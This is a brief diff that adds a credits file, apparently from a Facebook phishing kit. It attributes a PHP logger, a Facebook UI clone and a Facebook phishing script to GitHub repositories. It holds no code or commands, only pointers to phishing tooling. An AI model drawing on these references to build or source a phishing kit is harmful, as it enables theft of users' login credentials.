@@ -1,0 +1,3 @@
+PHP LOGGER by https://github.com/th3void
+Script by https://github.com/pranavks/fb-ui-clone
+Script by https://github.com/GustavoOliveiraRosa/phpfacebookphishing 
